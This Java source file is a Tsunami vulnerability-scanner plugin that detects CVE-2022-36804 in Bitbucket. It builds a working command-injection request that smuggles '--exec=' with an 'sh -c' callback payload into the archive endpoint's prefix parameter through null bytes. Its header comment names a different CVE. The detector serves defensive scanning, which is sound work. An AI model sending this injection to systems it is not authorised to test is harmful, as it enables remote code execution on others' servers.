package com.google.tsunami.plugins.detectors.bitbucket;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2022-0540 vulnerability. Reading */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    author = "SuperX-SIR",
    name = "Cve202236804VulnDetector",
    version = "0.1",
    description =
        "A vulnerability in Bitbucket allows remote code execution. An attacker with read to a"
            + " repository can execute arbitrary code by sending a malicious HTTP request. Versions"
            + " between 6.10.17 and 8.3.0 (included) are affected.",
    bootstrapModule = Cve202236804DetectorBootstrapModule.class)
public class Cve202236804VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String GET_ALL_PUB_PATH = "repos?visibility=public";
  private static final String STRING_PUB_REP = "Public Repositories";
  private static final Pattern PUBLIC_REPO_PATTERN =
      Pattern.compile(
          "<script>require\\('bitbucket/internal/page/global-repository-list/global-repository-list'\\)\\.init\\("
              + " document\\.getElementById\\('repository-container'\\),\\{repositoryPage:"
              + " (.*),\\}\\);</script>");
  private final HttpClient httpClient;
  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202236804VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE-2022-36804"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2022-36804"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("CVE-2022-36804: Bitbucket Command injection vulnerability")
            .setDescription(
                "A vulnerability in Bitbucket allows remote code execution. An attacker with"
                    + " read to a repository can execute arbitrary code by sending a malicious"
                    + " HTTP request. Versions between 6.10.17 and 8.3.0 (included) are"
                    + " affected.")
            .setRecommendation(
                "Update the Bitbucket Server and Data Center  installation to a version that "
                    + "provides a fix (7.6.17 (LTS), 7.17.10 (LTS), 7.21.4 (LTS), 8.0.3, 8.1.3,"
                    + " 8.2.2, 8.3.1)or later").build());
  }
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2022-36804 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    if (!payloadGenerator.isCallbackServerEnabled()) {
      logger.atInfo().log("Callback server disabled but required for this detector.");
      return false;
    }

    Payload payload = this.payloadGenerator.generate(config);
    String commandToInject = String.format("sh -c \"%s\"", payload.getPayload());
    String publicReposUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + GET_ALL_PUB_PATH;

    try {
      HttpResponse httpResponse =
          httpClient.send(get(publicReposUrl).withEmptyHeaders().build(), networkService);
      if (httpResponse.status().code() != 200
          || !httpResponse.bodyString().get().contains(STRING_PUB_REP)) {
        return false;
      }

      String repoArchiveLink =
          getArchiveLink(
              getPubLink(String.valueOf(httpResponse.bodyString())),
              URLEncoder.encode(commandToInject, "UTF-8"));
      if (repoArchiveLink.length() == 0) {
        return false;
      }

      httpClient.send(
          get(NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + repoArchiveLink)
              .withEmptyHeaders()
              .build(),
          networkService);
      return payload.checkIfExecuted();
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }

    return false;
  }

  private String getPubLink(String response) {
    String publink = "";
    Matcher matcher = PUBLIC_REPO_PATTERN.matcher(response);
    if (matcher.find()) {
      String res = matcher.group(1);
      JsonElement rootElement = JsonParser.parseString(res);
      JsonObject repositoryPage = rootElement.getAsJsonObject();
      if (repositoryPage.get("size").getAsInt() > 0) {

        JsonArray values = repositoryPage.getAsJsonArray("values");
        for (int i = 0; i < repositoryPage.get("size").getAsInt(); i++) {
          JsonArray selfs =
              values.get(i).getAsJsonObject().getAsJsonObject("links").getAsJsonArray("self");
          for (JsonElement hreflink : selfs) {
            publink = hreflink.getAsJsonObject().get("href").getAsString();
            return publink;
          }
        }
      }
    }
    return publink;
  }

  private String getArchiveLink(String publink, String commandToInject)
      throws MalformedURLException {
    String archiveLink = "";
    if (publink.length() == 0) {
      return archiveLink;
    } else {
      URL url = new URL(publink);
      archiveLink =
          "rest/api/latest"
              + url.getPath().substring(0, url.getPath().lastIndexOf("/"))
              + "/archive"
              + "?format=zip&prefix=123%00--exec="
              + commandToInject
              + "%00--remote=git@g.com/a/b";
      return archiveLink;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
